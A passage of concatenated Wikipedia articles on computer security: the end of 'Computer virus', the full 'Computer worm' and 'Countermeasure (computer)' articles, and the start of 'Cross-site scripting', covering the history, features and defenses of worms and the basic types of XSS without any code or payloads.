Computer fraud


Cybergeddon


Cyberterrorism


Cyberwarfare


Electromagnetic warfare


Information warfare


Internet security


Mobile security


Network security


Copy protection


Digital rights management


vectorial version
Threats


Adware


Advanced persistent threat


Arbitrary code execution


Backdoors


Bombs

Fork


Logic


Time


Zip


Hardware backdoors


Code injection


Crimeware


Cross-site scripting


Cross-site leaks


DOM clobbering


History sniffing


Cryptojacking


Botnets


Data breach


Drive-by download


Browser Helper Objects


Viruses


Data scraping


Denial-of-service attack


Eavesdropping


Email fraud


Email spoofing


Exploits


Fraudulent dialers


Hacktivism


Infostealer


Insecure direct object reference


Keystroke loggers


Malware


Payload


Phishing


Voice


Polymorphic engine


Privilege escalation


Ransomware


Rootkits


Scareware


Shellcode


Spamming


Social engineering


Spyware


Software bugs


Trojan horses


Hardware Trojans


Remote access trojans


Vulnerability


Web shells


Wiper


Worms


SQL injection


Rogue security software


Zombie


Defenses


Application security


Secure coding


Secure by default


Secure by design


Misuse case


Computer access control


Authentication


Multi-factor authentication


Authorization


Computer security software


Antivirus software


Security-focused operating system


Data-centric security


Obfuscation (software)


Data masking


Encryption


Firewall


Intrusion detection system


Host-based intrusion detection system
 (HIDS)


Anomaly detection


Information security management


Information risk management


Security information and event management
 (SIEM)


Runtime application self-protection


Site isolation




v
t
e
Malware
 topics
Infectious malware


Comparison of computer viruses


Computer virus


Computer worm


List of computer worms


Timeline of computer viruses and worms


Concealment


Backdoor


Clickjacking


Man-in-the-browser


Man-in-the-middle


Rootkit


Trojan horse


Zombie computer


Malware for profit


Adware


Botnet


Crimeware


Fleeceware


Form grabbing


Fraudulent dialer


Infostealer


Keystroke logging


Malbot


Privacy-invasive software


Ransomware


Rogue security software


Scareware


Spyware


Web threats


By operating system


Android malware


Classic Mac OS viruses


iOS malware


Linux malware


MacOS malware


Macro virus


Mobile malware


Palm OS viruses


HyperCard viruses


Protection


Anti-keylogger


Antivirus software


Browser security


Data loss prevention software


Defensive computing


Firewall


Internet security


Intrusion detection system


Mobile security


Network security


Countermeasures


Computer and network surveillance


Honeypot


Operation: Bot Roast




Authority control databases
: National 
Germany
United States
France
BnF data
Japan
Czech Republic
Israel






Retrieved from "
https://en.wikipedia.org/w/index.php?title=Computer_virus&oldid=1246235221
"


Categories
: 
Computer viruses
Computer security exploits
Internet security
Deception
Security breaches
Types of malware
Hidden categories: 
Webarchive template wayback links
All articles lacking reliable references
Articles lacking reliable references from October 2022
CS1 errors: missing periodical
CS1 maint: numeric names: authors list
CS1 maint: unfit URL
CS1 maint: location
Articles with short description
Short description is different from Wikidata
All articles with unsourced statements
Articles with unsourced statements from January 2019
Articles with unsourced statements from May 2016
Commons category link is on Wikidata
Articles with Curlie links
Wikipedia indefinitely move-protected pages
Wikipedia pending changes protected pages











From Wikipedia, the free encyclopedia






Self-replicating malware program


This article is about coding of a worm. For the data storage device, see 
write once read many
. For other uses, see 
Worm (disambiguation)
.


Not to be confused with 
Computer virus
.


Hex dump
 of the 
Blaster worm
, showing a message left for 
Microsoft
 
CEO
 
Bill Gates
 by the worm's creator


Spread of 
Conficker worm


A 
computer worm
 is a standalone 
malware
 
computer program
 that replicates itself in order to spread to other computers.
[
1
]
 It often uses a 
computer network
 to spread itself, relying on security failures on the target computer to access it. It will use this machine as a host to scan and infect other computers. When these new worm-invaded computers are controlled, the worm will continue to scan and infect other computers using these computers as hosts, and this behaviour will continue.
[
2
]
 Computer worms use recursive methods to copy themselves without host programs and distribute themselves based on exploiting the advantages of 
exponential growth
, thus controlling and infecting more and more computers in a short time.
[
3
]
 Worms almost always cause at least some harm to the network, even if only by consuming 
bandwidth
, whereas 
viruses
 almost always corrupt or modify files on a targeted computer.

Many worms are designed only to spread, and do not attempt to change the systems they pass through. However, as the 
Morris worm
 and 
Mydoom
 showed, even these "payload-free" worms can cause major disruption by increasing network traffic and other unintended effects.





History
[
edit
]


Morris worm
 source code floppy diskette at the 
Computer History Museum


The term "worm" was first used in 
John Brunner
's 1975 novel, 
The Shockwave Rider
. In the novel, Nichlas Haflinger designs and sets off a data-gathering worm in an act of revenge against the powerful men who run a national electronic information web that induces mass conformity. "You have the biggest-ever worm loose in the net, and it automatically sabotages any attempt to monitor it. There's never been a worm with that tough a head or that long a tail!"
[
4
]
 "Then the answer dawned on him, and he almost laughed. Fluckner had resorted to one of the oldest tricks in the store and turned loose in the continental net a self-perpetuating tapeworm, probably headed by a denunciation group "borrowed" from a major corporation, which would shunt itself from one nexus to another every time his credit-code was punched into a keyboard. It could take days to kill a worm like that, and sometimes weeks."
[
4
]


The second ever computer worm was devised to be an anti-virus software. Named 
Reaper
, it was created by 
Ray Tomlinson
 to replicate itself across the 
ARPANET
 and delete the experimental 
Creeper
 program (the first computer worm, 1971).

On November 2, 1988, 
Robert Tappan Morris
, a 
Cornell University
 computer science graduate student, unleashed what became known as the 
Morris worm
, disrupting many computers then on the Internet, guessed at the time to be one tenth of all those connected.
[
5
]
 During the Morris appeal process, the U.S. Court of Appeals estimated the cost of removing the worm from each installation at between $200 and $53,000; this work prompted the formation of the 
CERT Coordination Center
[
6
]
 and Phage mailing list.
[
7
]
 Morris himself became the first person tried and convicted under the 1986 
Computer Fraud and Abuse Act
.
[
8
]


Conficker
, a computer worm discovered in 2008 that primarily targeted 
Microsoft Windows
 operating systems, is a worm that employs 3 different spreading strategies: local probing, neighborhood probing, and global probing.
[
9
]
 This worm was considered a hybrid epidemic and affected millions of computers. The term "hybrid epidemic" is used because of the three separate methods it employed to spread, which was discovered through code analysis.
[
10
]




Features
[
edit
]


Independence


Computer viruses generally require a host program.
[
11
]
 The virus writes its own code into the host program. When the program runs, the written virus program is executed first, causing infection and damage. A worm does not need a host program, as it is an independent program or code chunk. Therefore, it is not restricted by the 
host program
, but can run independently and actively carry out attacks.
[
12
]
[
13
]


Exploit attacks


Because a worm is not limited by the host program, worms can take advantage of various operating system vulnerabilities to carry out active attacks. For example, the "
Nimda
" virus 
exploits
 
vulnerabilities
 to attack.

Complexity


Some worms are combined with web page scripts, and are hidden in 
HTML
 pages using 
VBScript
, 
ActiveX
 and other technologies. When a user accesses a webpage containing a virus, the virus automatically resides in memory and waits to be triggered. There are also some worms that are combined with 
backdoor
 programs or 
Trojan horses
, such as "
Code Red
".
[
14
]


Contagiousness


Worms are more infectious than traditional viruses. They not only infect local computers, but also all servers and clients on the network based on the local computer. Worms can easily spread through 
shared folders
, 
e-mails
,
[
15
]
 malicious web pages, and servers with a large number of vulnerabilities in the network.
[
16
]




Harm
[
edit
]


Any code designed to do more than spread the worm is typically referred to as the "
payload
". Typical malicious payloads might delete files on a host system (e.g., the 
ExploreZip
 worm), encrypt files in a 
ransomware
 attack, or 
exfiltrate data
 such as confidential documents or passwords.
[
citation needed
]


Some worms may install a 
backdoor
. This allows the computer to be remotely controlled by the worm author as a "
zombie
". Networks of such machines are often referred to as 
botnets
 and are very commonly used for a range of malicious purposes, including sending 
spam
 or performing 
DoS
 attacks.
[
17
]
[
18
]
[
19
]


Some special worms attack industrial systems in a targeted manner. 
Stuxnet
 was primarily transmitted through LANs and infected thumb-drives, as its targets were never connected to untrusted networks, like the internet.  This virus can destroy the core production control computer software used by chemical, power generation and power transmission companies in various countries around the world - in Stuxnet's case, Iran, Indonesia and India were hardest hit - it was used to "issue orders" to other equipment in the factory, and to hide those commands from being detected.  Stuxnet used multiple vulnerabilities and four different zero-day exploits (e.g.: 
[1]
) in 
Windows systems
 and Siemens 
SIMATICWinCC
 systems to attack the embedded programmable logic controllers of industrial machines.  Although these systems operate independently from the network, if the operator inserts a virus-infected drive into the system's USB interface, the virus will be able to gain control of the system without any other operational requirements or prompts.
[
20
]
[
21
]
[
22
]




Countermeasures
[
edit
]


Worms spread by exploiting vulnerabilities in operating systems.
Vendors with security problems supply regular security updates
[
23
]
 (see "
Patch Tuesday
"), and if these are installed to a machine, then the majority of worms are unable to spread to it. If a vulnerability is disclosed before the security patch released by the vendor, a 
zero-day attack
 is possible.

Users need to be wary of opening unexpected emails,
[
24
]
[
25
]
 and should not run attached files or programs, or visit web sites that are linked to such emails. However, as with the 
ILOVEYOU
 worm, and with the increased growth and efficiency of 
phishing
 attacks, it remains possible to trick the end-user into running malicious code.

Anti-virus
 and 
anti-spyware
 software are helpful, but must be kept up-to-date with new pattern files at least every few days. The use of a 
firewall
 is also recommended.

Users can minimize the threat posed by worms by keeping their computers' operating system and other software up to date, avoiding opening unrecognized or unexpected emails and running 
firewall
 and antivirus software.
[
26
]


Mitigation techniques include:



ACLs
 in 
routers
 and 
switches


Packet-filters


TCP Wrapper
/
ACL
 enabled network service 
daemons


EPP
/
EDR
 software


Nullroute


Infections can sometimes be detected by their behavior - typically scanning the Internet randomly, looking for vulnerable hosts to infect.
[
27
]
[
28
]
 In addition, machine learning techniques can be used to detect new worms, by analyzing the behavior of the suspected computer.
[
29
]




Worms with good intent
[
edit
]


A 
helpful worm
 or 
anti-worm
 is a worm designed to do something that its author feels is helpful, though not necessarily with the permission of the executing computer's owner. Beginning with the first research into worms at 
Xerox PARC
, there have been attempts to create useful worms. Those worms allowed 
John Shoch
 and Jon Hupp to test the 
Ethernet
 principles on their network of 
Xerox Alto
 computers.
[
30
]
 Similarly, the 
Nachi
 family of worms tried to download and install patches from Microsoft's website to fix vulnerabilities in the host system by exploiting those same vulnerabilities.
[
31
]
 In practice, although this may have made these systems more secure, it generated considerable network traffic, rebooted the machine in the course of patching it, and did its work without the consent of the computer's owner or user. Regardless of their payload or their writers' intentions, security experts regard all worms as 
malware
. Another example of this approach is 
Roku OS
 patching a bug allowing for Roku OS to be rooted via an update to their screensaver channels, which the screensaver would attempt to connect to the telnet and patch the device.
[
32
]


One study proposed the first computer worm that operates on the second layer of the 
OSI model
 (Data link Layer), utilizing topology information such as 
Content-addressable memory
 (CAM) tables and Spanning Tree information stored in switches to propagate and probe for vulnerable nodes until the enterprise network is covered.
[
33
]


Anti-worms have been used to combat the effects of the 
Code Red
,
[
34
]
 
Blaster
, and 
Santy
 worms. 
Welchia
 is an example of a helpful worm.
[
35
]
 Utilizing the same deficiencies exploited by the 
Blaster worm
, Welchia infected computers and automatically began downloading 
Microsoft
 security updates for 
Windows
 without the users' consent. Welchia automatically reboots the computers it infects after installing the updates. One of these updates was the patch that fixed the exploit.
[
35
]


Other examples of helpful worms are "Den_Zuko", "Cheeze", "CodeGreen", and "Millenium".
[
35
]


Art worms support artists in the performance of massive scale ephemeral artworks. It turns the infected computers into nodes that contribute to the artwork.
[
36
]




See also
[
edit
]


List of computer worms


BlueKeep


Botnet


Code Shikara (Worm)


Computer and network surveillance


Computer virus


Computer security


Email spam


Father Christmas (computer worm)


Self-replicating machine


Technical support scam
 – unsolicited phone calls from a fake "tech support" person, claiming that the computer has a virus or other problems


Timeline of computer viruses and worms


Trojan horse (computing)


Worm memory test


XSS worm


Zombie (computer science)


References
[
edit
]






^
 
Barwise, Mike. 
"What is an internet worm?"
. BBC. Archived from 
the original
 on 2015-03-24
. Retrieved 
9 September
 2010
.




^
 
Zhang, Changwang; Zhou, Shi; Chain, Benjamin M. (2015-05-15). 
"Hybrid Epidemics—A Case Study on Computer Worm Conficker"
. 
PLOS ONE
. 
10
 (5): e0127478. 
arXiv
:
1406.6046
. 
Bibcode
:
2015PLoSO..1027478Z
. 
doi
:
10.1371/journal.pone.0127478
. 
ISSN
 
1932-6203
. 
PMC
 
4433115
. 
PMID
 
25978309
.




^
 
Marion, Jean-Yves (2012-07-28). 
"From Turing machines to computer viruses"
. 
Philosophical Transactions of the Royal Society A: Mathematical, Physical and Engineering Sciences
. 
370
 (1971): 3319–3339. 
Bibcode
:
2012RSPTA.370.3319M
. 
doi
:
10.1098/rsta.2011.0332
. 
ISSN
 
1364-503X
. 
PMID
 
22711861
.




^ 
a
 
b
 
Brunner, John (1975). 
The Shockwave Rider
. New York: Ballantine Books. 
ISBN
 
978-0-06-010559-4
.




^
 
"The Submarine"
. 
www.paulgraham.com
.




^
 
"Security of the Internet"
. 
CERT/CC
.




^
 
"Phage mailing list"
. securitydigest.org. Archived from 
the original
 on 2011-07-26
. Retrieved 
2014-09-17
.




^
 
Dressler, J. (2007). "United States v. Morris". 
Cases and Materials on Criminal Law
. St. Paul, MN: Thomson/West. 
ISBN
 
978-0-314-17719-3
.




^
 
Zhang, Changwang; Zhou, Shi; Chain, Benjamin M. (2015-05-15). 
"Hybrid Epidemics—A Case Study on Computer Worm Conficker"
. 
PLOS ONE
. 
10
 (5): e0127478. 
arXiv
:
1406.6046
. 
Bibcode
:
2015PLoSO..1027478Z
. 
doi
:
10.1371/journal.pone.0127478
. 
ISSN
 
1932-6203
. 
PMC
 
4433115
. 
PMID
 
25978309
.




^
 
Zhang, Changwang; Zhou, Shi; Chain, Benjamin M. (2015-05-15). Sun, Gui-Quan (ed.). 
"Hybrid Epidemics—A Case Study on Computer Worm Conficker"
. 
PLOS ONE
. 
10
 (5): e0127478. 
arXiv
:
1406.6046
. 
Bibcode
:
2015PLoSO..1027478Z
. 
doi
:
10.1371/journal.pone.0127478
. 
ISSN
 
1932-6203
. 
PMC
 
4433115
. 
PMID
 
25978309
.




^
 
"Worm vs. Virus: What's the Difference and Does It Matter?"
. 
Worm vs. Virus: What's the Difference and Does It Matter?
. Retrieved 
2021-10-08
.




^
 
Yeo, Sang-Soo. (2012). 
Computer science and its applications : CSA 2012, Jeju, Korea, 22-25.11.2012
. Springer. p. 515. 
ISBN
 
978-94-007-5699-1
. 
OCLC
 
897634290
.




^
 
Yu, Wei; Zhang, Nan; Fu, Xinwen; Zhao, Wei (October 2010). "Self-Disciplinary Worms and Countermeasures: Modeling and Analysis". 
IEEE Transactions on Parallel and Distributed Systems
. 
21
 (10): 1501–1514. 
doi
:
10.1109/tpds.2009.161
. 
ISSN
 
1045-9219
. 
S2CID
 
2242419
.




^
 
Brooks, David R. (2017), "Introducing HTML", 
Programming in HTML and PHP
, Undergraduate Topics in Computer Science, Springer International Publishing, pp. 1–10, 
doi
:
10.1007/978-3-319-56973-4_1
, 
ISBN
 
978-3-319-56972-7




^
 
Deng, Yue; Pei, Yongzhen; Li, Changguo (2021-11-09). 
"Parameter estimation of a susceptible–infected–recovered–dead computer worm model"
. 
Simulation
. 
98
 (3): 209–220. 
doi
:
10.1177/00375497211009576
. 
ISSN
 
0037-5497
. 
S2CID
 
243976629
.




^
 
Lawton, George (June 2009). "On the Trail of the Conficker Worm". 
Computer
. 
42
 (6): 19–22. 
doi
:
10.1109/mc.2009.198
. 
ISSN
 
0018-9162
. 
S2CID
 
15572850
.




^
 
Ray, Tiernan (February 18, 2004). 
"Business & Technology: E-mail viruses blamed as spam rises sharply"
. 
The Seattle Times
. Archived from 
the original
 on August 26, 2012
. Retrieved 
May 18,
 2007
.




^
 
McWilliams, Brian (October 9, 2003). 
"Cloaking Device Made for Spammers"
. 
Wired
.




^
 
"Hacker threats to bookies probed"
. 
BBC News
. February 23, 2004.




^
 
Bronk, Christopher; Tikk-Ringas, Eneken (May 2013). "The Cyber Attack on Saudi Aramco". 
Survival
. 
55
 (2): 81–96. 
doi
:
10.1080/00396338.2013.784468
. 
ISSN
 
0039-6338
. 
S2CID
 
154754335
.




^
 
Lindsay, Jon R. (July 2013). "Stuxnet and the Limits of Cyber Warfare". 
Security Studies
. 
22
 (3): 365–404. 
doi
:
10.1080/09636412.2013.816122
. 
ISSN
 
0963-6412
. 
S2CID
 
154019562
.




^
 
Wang, Guangwei; Pan, Hong; Fan, Mingyu (2014). "Dynamic Analysis of a Suspected Stuxnet Malicious Code". 
Proceedings of the 3rd International Conference on Computer Science and Service System
. Vol. 109. Paris, France: Atlantis Press. 
doi
:
10.2991/csss-14.2014.86
. 
ISBN
 
978-94-6252-012-7
.




^
 
"USN list"
. Ubuntu
. Retrieved 
2012-06-10
.




^
 
"Threat Description Email-Worm"
. Archived from 
the original
 on 2018-01-16
. Retrieved 
2018-12-25
.




^
 
"Email-Worm:VBS/LoveLetter Description | F-Secure Labs"
. 
www.f-secure.com
.




^
 
"Computer Worm Information and Removal Steps"
. Veracode. 2014-02-02
. Retrieved 
2015-04-04
.




^
 
Sellke, S. H.; Shroff, N. B.; Bagchi, S. (2008). "Modeling and Automated Containment of Worms". 
IEEE Transactions on Dependable and Secure Computing
. 
5
 (2): 71–86. 
doi
:
10.1109/tdsc.2007.70230
.




^
 
"A New Way to Protect Computer Networks from Internet Worms"
. 
Newswise
. Retrieved 
July 5,
 2011
.




^
 
Moskovitch, Robert; Elovici, Yuval; Rokach, Lior (2008). "Detection of unknown computer worms based on behavioral classification of the host". 
Computational Statistics & Data Analysis
. 
52
 (9): 4544–4566. 
doi
:
10.1016/j.csda.2008.01.028
. 
S2CID
 
1097834
.




^
 
Shoch, John; Hupp, Jon (Mar 1982). 
"The "Worm" Programs - Early Experience with a Distributed Computation"
. 
Communications of the ACM
. 
25
 (3): 172–180. 
doi
:
10.1145/358453.358455
. 
S2CID
 
1639205
.




^
 
"Virus alert about the Nachi worm"
. Microsoft.




^
 
"Root My Roku"
. 
GitHub
.




^
 
Al-Salloum, Z. S.; Wolthusen, S. D. (2010). "A link-layer-based self-replicating vulnerability discovery agent". 
The IEEE symposium on Computers and Communications
. p. 704. 
doi
:
10.1109/ISCC.2010.5546723
. 
ISBN
 
978-1-4244-7754-8
. 
S2CID
 
3260588
.




^
 
"vnunet.com 'Anti-worms' fight off Code Red threat"
. Sep 14, 2001. Archived from 
the original
 on 2001-09-14.




^ 
a
 
b
 
c
 
The Welchia Worm
. December 18, 2003. p. 1
. Retrieved 
9 June
 2014
.




^
 
Aycock, John (2022-09-15). 
"Painting the Internet"
. 
Leonardo
. 
42
 (2): 112–113 – via MUSE.






External links
[
edit
]


Malware Guide
 (archived link) – Guide for understanding, removing and preventing worm infections on Vernalex.com.


"The 'Worm' Programs – Early Experience with a Distributed Computation"
, John Shoch and Jon Hupp, 
Communications of the ACM
, Volume 25 Issue 3 (March 1982), pp. 172–180.


"The Case for Using Layered Defenses to Stop Worms"
, Unclassified report from the U.S. National Security Agency (NSA), 18 June 2004.


Worm Evolution
 (archived link), paper by Jago Maniscalchi on Digital Threat, 31 May 2009.


v
t
e
Malware
 topics
Infectious malware


Comparison of computer viruses


Computer virus


Computer worm


List of computer worms


Timeline of computer viruses and worms


Concealment


Backdoor


Clickjacking


Man-in-the-browser


Man-in-the-middle


Rootkit


Trojan horse


Zombie computer


Malware for profit


Adware


Botnet


Crimeware


Fleeceware


Form grabbing


Fraudulent dialer


Infostealer


Keystroke logging


Malbot


Privacy-invasive software


Ransomware


Rogue security software


Scareware


Spyware


Web threats


By operating system


Android malware


Classic Mac OS viruses


iOS malware


Linux malware


MacOS malware


Macro virus


Mobile malware


Palm OS viruses


HyperCard viruses


Protection


Anti-keylogger


Antivirus software


Browser security


Data loss prevention software


Defensive computing


Firewall


Internet security


Intrusion detection system


Mobile security


Network security


Countermeasures


Computer and network surveillance


Honeypot


Operation: Bot Roast




v
t
e
Information security
Related security categories


Computer security


Automotive security


Cybercrime


Cybersex trafficking


Computer fraud


Cybergeddon


Cyberterrorism


Cyberwarfare


Electromagnetic warfare


Information warfare


Internet security


Mobile security


Network security


Copy protection


Digital rights management


vectorial version
Threats


Adware


Advanced persistent threat


Arbitrary code execution


Backdoors


Bombs

Fork


Logic


Time


Zip


Hardware backdoors


Code injection


Crimeware


Cross-site scripting


Cross-site leaks


DOM clobbering


History sniffing


Cryptojacking


Botnets


Data breach


Drive-by download


Browser Helper Objects


Viruses


Data scraping


Denial-of-service attack


Eavesdropping


Email fraud


Email spoofing


Exploits


Fraudulent dialers


Hacktivism


Infostealer


Insecure direct object reference


Keystroke loggers


Malware


Payload


Phishing


Voice


Polymorphic engine


Privilege escalation


Ransomware


Rootkits


Scareware


Shellcode


Spamming


Social engineering


Spyware


Software bugs


Trojan horses


Hardware Trojans


Remote access trojans


Vulnerability


Web shells


Wiper


Worms


SQL injection


Rogue security software


Zombie


Defenses


Application security


Secure coding


Secure by default


Secure by design


Misuse case


Computer access control


Authentication


Multi-factor authentication


Authorization


Computer security software


Antivirus software


Security-focused operating system


Data-centric security


Obfuscation (software)


Data masking


Encryption


Firewall


Intrusion detection system


Host-based intrusion detection system
 (HIDS)


Anomaly detection


Information security management


Information risk management


Security information and event management
 (SIEM)


Runtime application self-protection


Site isolation








Authority control databases
: National 
Germany










Retrieved from "
https://en.wikipedia.org/w/index.php?title=Computer_worm&oldid=1246397388
"


Categories
: 
Computer worms
Security breaches
Types of malware
Hidden categories: 
Articles with short description
Short description is different from Wikidata
Wikipedia indefinitely move-protected pages
All articles with unsourced statements
Articles with unsourced statements from March 2020











From Wikipedia, the free encyclopedia






Process to reduce a security threat


For other uses, see 
Countermeasure
.



In 
computer security
 a 
countermeasure
 is an action, 
device
, procedure, or technique that reduces a 
threat
, 
vulnerability
, or 
attack
, eliminating or preventing it by minimizing the 
harm
 it can cause. It can also include discovering and reporting vunerabilities so that corrective action can be taken.

The definition is given in 
IETF
 RFC 2828
[
1
]
 and CNSS Instruction No. 4009 dated 26 April 2010 by the 
Committee on National Security Systems
.
[
2
]


According to the Glossary
[
3
]
 by 
InfosecToday
, the meaning of countermeasure is:



The deployment of a set of security services to protect against a security threat.


A synonym is 
security control
.
[
2
]
[
4
]

In telecommunications, communication countermeasures are defined as 
security services
 as part of the 
OSI Reference model
 by ITU-T X.800 Recommendation.
X.800 and ISO ISO 7498-2 (Information processing systems – Open systems interconnection – Basic Reference Model – Part 2: Security architecture are technically aligned.

The following picture explains the relationships between these concepts and terms:



      + - - - - - - - - - - - - +  + - - - - +  + - - - - - - - - - - -+
      | An Attack:              |  |Counter- |  | A System Resource:   |
      | i.e., A Threat Action   |  | measure |  | Target of the Attack |
      | +----------+            |  |         |  | +-----------------+  |
      | | Attacker |<==================||<=========                 |  |
      | |   i.e.,  |   Passive  |  |         |  | |  Vulnerability  |  |
      | | A Threat |<=================>||<========>                 |  |
      | |  Agent   |  or Active |  |         |  | +-------|||-------+  |
      | +----------+   Attack   |  |         |  |         VVV          |
      |                         |  |         |  | Threat Consequences  |
      + - - - - - - - - - - - - +  + - - - - +  + - - - - - - - - - - -+



A resource (both physical or logical) can have one or more vulnerabilities that can be exploited by a threat agent in a threat action. The result can potentially compromise the 
confidentiality
, 
integrity
 or 
availability
 properties of these resources (potentially different than the vulnerable one) of the organization and other involved parties (customers, suppliers).
 The so-called CIA triad is the basis of 
information security
.

The attack can be active when it attempts to alter system resources or affect their operation: so it compromises integrity or availability. A "passive attack" attempts to learn or make use of information from the system but does not affect system resources, compromising confidentiality.

A threat is a potential for violation of security, which exists when there is a circumstance, capability, action, or event that could breach security and cause harm. That is, a threat is a possible danger enabling the exploitation of a vulnerability. A threat can be either "intentional" (i.e., intelligent; e.g., an individual cracker or a criminal organization) or "accidental" (e.g., the possibility of a computer malfunctioning, or the possibility of an "act of God" such as an earthquake, fire, or tornado).
[
1
]


A set of policies concerned with information security management, the 
information security management systems
 (ISMS), has been developed to manage, according to 
risk management
 principles, the countermeasures in order to accomplish to a security strategy set up following rules and regulations applicable in a country.
[
4
]






Countermeasures Against Physical Attacks
[
edit
]


If a potential malicious actor has physical access to a computer system, they have a greater chance of inflicting harm upon it.



Electronic Destruction Devices
[
edit
]


Devices such as a 
USB Killer
 may be used to damage or render completely unusable anything with a connection to the 
motherboard
 of a computer, such as a USB port, video port, Ethernet port, or serial port.
[
5
]
 Without proper protection, these devices may result in the destruction of ports, 
adapter cards
, storage devices, 
RAM
, motherboards, CPUs, or anything physically connected to the device attacked, such as monitors, flash drives, or 
wired switches
. These types of devices can even be used to damage smartphones and cars, as well.
[
6
]


This threat can be mitigated by not installing or restricting physical access to easily accessible ports in situations where they are not necessary. A port-closing lock which permanently disables access to a port short of the actual port being disassembled.
[
7
]
 When it is necessary for a port to be accessible, an 
optocoupler
 can allow for a port to send and receive data to a computer or device without a direct electrical connection, preventing the computer or device from receiving any dangerous voltage from an external device.
[
8
]




Hard Drives and Storage
[
edit
]


In an unsecured scenario, a malicious actor may steal or destroy storage devices such as hard drives or SSDs, resulting in the destruction or theft of valuable data.

If the data of a storage device is no longer necessary, data theft is best prevented against by physically destroying or shredding the storage device.
[
9
]


If the data of a storage device is in use and must be secured, one can use 
encryption
 to encrypt the contents of a storage device, or even 
encrypt the whole storage device
 save for the master boot record. The device can then be unlocked with a password, 
biometric authentication
, a physical 
dongle
, a network interchange, a 
one-time password
, or any combination thereof. If this device is a 
boot drive
, however, it must be unencrypted in a pre-boot environment so the operating system can be accessed. 
Striping
, or breaking data into chunks stored upon multiple drives which must be assemble in order to access the data, is a possible solution to physical drive theft, provided that the drives are stored in multiple, individually secured locations, and are enough in number that no one drive can be used to piece together meaningful information.

Not to be neglected is the process of adding physical barriers to the storage devices themselves. Locked cases or physically hidden drives, with a limited number of personnel with knowledge and access to the keys or locations, may prove to be a good first line against physical theft.



See also
[
edit
]




Countermeasure


Computer security


Computer insecurity


Common Vulnerabilities and Exposures
 (CVE)


Common Vulnerability Scoring System
 (CVSS)


Exploit (computer security)


Full disclosure (computer security)


IT risk


Metasploit


Month of Bugs


Vulnerability management


w3af




References
[
edit
]






^ 
a
 
b
 
RFC 2828 Internet Security Glossary




^ 
a
 
b
 
CNSS Instruction No. 4009
 
Archived
 27 February 2012 at the 
Wayback Machine
 dated 26 April 2010




^
 
"InfosecToday Glossary"
 
(PDF)
. Archived from 
the original
 
(PDF)
 on 20 November 2014
. Retrieved 
30 September
 2010
.




^ 
a
 
b
 
Wright, Joe; Harmening, Jim (2009). "15". In Vacca, John (ed.). 
Computer and Information Security Handbook
. Morgan Kaufmann Publications. Elsevier Inc. p. 257. 
ISBN
 
978-0-12-374354-1
.




^
 
"USB Killer, yours for $50, lets you easily fry almost every device"
. 
Ars Technica
. Retrieved 
26 August
 2018
.




^
 
"This $50 USB Killer Can Destroy Almost Any Smartphone, Computer Or Car Within Seconds"
. 
TechFonder
. Retrieved 
26 August
 2018
.




^
 
"Bench Talk | Protect USB Ports From Nefarious "USB Killers"
"
. 
mouser.com
. Retrieved 
26 August
 2018
.




^
 
"Optocoupler Tutorial"
. 
ElectronicsTutorials
.




^
 
"Discarded hard drives can be dangerous"
. 
ComputerWeekly.com
. Retrieved 
26 August
 2018
.






External links
[
edit
]


Term in FISMApedia










Retrieved from "
https://en.wikipedia.org/w/index.php?title=Countermeasure_(computer)&oldid=1209466787
"


Category
: 
Computer network security
Hidden categories: 
Webarchive template wayback links
Articles with short description
Short description is different from Wikidata
Use dmy dates from October 2023











From Wikipedia, the free encyclopedia






Computer security vulnerability
"XSS" redirects here. For other uses, see 
XSS (disambiguation)
.


Cross-site scripting
 (
XSS
) is a type of security 
vulnerability
 that can be found in some 
web applications
. XSS attacks enable attackers to 
inject
 
client-side scripts
 into web pages viewed by other users. A cross-site scripting vulnerability may be used by attackers to bypass 
access controls
 such as the 
same-origin policy
. During the second half of 2007, XSSed documented 11,253 site-specific cross-site vulnerabilities, compared to 2,134 "traditional" vulnerabilities documented by 
Symantec
.
[
1
]
 XSS effects vary in 
range from petty nuisance to significant security risk, depending on the sensitivity of the data handled by the vulnerable site and the nature of any security mitigation implemented by the site's owner 
network
.

OWASP
 considers the term cross-site scripting to be a 
misnomer
. It initially was an attack that was used for breaching data across sites, but gradually started to include other forms of data injection attacks.
[
2
]






Background
[
edit
]


Main articles: 
Web security
 and 
Same-origin policy


Security on the web depends on a variety of mechanisms, including an underlying concept of trust known as the 
same-origin policy
. This states that if content from one site (such as 
https://mybank.example1.com
) is granted permission to access resources (like cookies etc.) on a web browser, then content from any URL with the same (1) 
URI scheme
 (e.g. ftp, http, or https), (2) 
host name
, 
and
 (3) 
port number
 will share these permissions. Content from URLs where any of these three attributes are different will have to be granted permissions separately.
[
3
]


Cross-site scripting attacks use known vulnerabilities in 
web-based applications
, their 
servers
, or the plug-in systems on which they rely. Exploiting one of these, attackers fold malicious content into the content being delivered from the compromised site. When the resulting combined content arrives at the client-side web browser, it has all been delivered from the trusted source, and thus operates under the permissions granted to that system. By finding ways of injecting malicious scripts into web pages, an attacker can gain elevated access-privileges to sensitive page content, to session cookies, and to a variety of other information maintained by the browser on behalf of the user. Cross-site scripting attacks are a case of 
code injection
.

Microsoft
 security-engineers introduced the term "cross-site scripting" in January 2000.
[
4
]
 The expression "cross-site scripting" originally referred to the act of loading the attacked, third-party web application from an unrelated attack-site, in a manner that executes a fragment of JavaScript prepared by the attacker in the 
security context
 of the targeted domain (taking advantage of a 
reflected
 or 
non-persistent
 XSS vulnerability). The definition gradually expanded to encompass other modes of code injection, including persistent and non-JavaScript vectors (including 
ActiveX
, 
Java
, 
VBScript
, 
Flash
, or even 
HTML
 scripts), causing some confusion to newcomers to the field of 
information security
.
[
5
]


XSS vulnerabilities have been reported and exploited since the 1990s. Prominent sites affected in the past include the social-networking sites 
Twitter
[
6
]
 and 

Facebook
.
[
7
]
 Cross-site scripting flaws have since surpassed 
buffer overflows
 to become the most common publicly reported security vulnerability,
[
8
]
 with some researchers in 2007 estimating as many as 68% of websites are likely open to XSS attacks.
[
9
]




Types
[
edit
]


There is no single, standardized classification of cross-site scripting flaws, but most experts distinguish between at least two primary flavors of XSS flaws: 
non-persistent
 and 
persistent
. Some sources further divide these two groups into 
traditional
 (caused by server-side code flaws) and 
DOM
-based
 (in client-side code).



Non-persistent (reflected)
[
edit
]


The 
non-persistent
 (or 
reflected
) cross-site scripting vulnerability is by far the most basic type of web vulnerability.
[
10
]
 These holes show up when the data provided by a web client,
[
11
]
 most commonly in HTTP query parameters (e.g. HTML form submission), is used immediately by server-side scripts to parse and display a page of results for and to that user, without properly 
sanitizing
 the content.
[
12
]


